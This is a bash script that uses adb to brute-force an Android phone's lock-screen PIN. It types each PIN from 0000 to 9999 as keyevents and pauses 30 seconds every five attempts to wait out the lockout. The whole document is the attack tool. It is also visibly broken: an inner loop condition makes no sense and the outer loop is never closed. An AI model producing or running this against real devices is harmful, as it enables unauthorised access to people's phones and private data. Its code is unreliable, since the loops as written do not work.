#!/bin/bash

adb shell input keyevent 3
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
while true
do
    for i in {0000..9999}; do
        if [[ $i != 1036 ]]; then
            echo -e "\e[0;1mTrying pin:  $i\e[0m"
            while [ "$i" -le 4 ]; do
            for (( j=0; j<${#i}; j++ )); do
                adb shell input keyevent $((`echo ${i:$j:1}`+7))
            done
            adb shell input keyevent 66
            adb shell input keyevent 3
            if ! (( `expr $i + 1` % 5 )); then
                echo "now timeout"
                adb shell input keyevent 66
                sleep 30
                adb shell input keyevent 3
                adb shell input swipe 407 1211 378 85
            fi
        fi
    done
done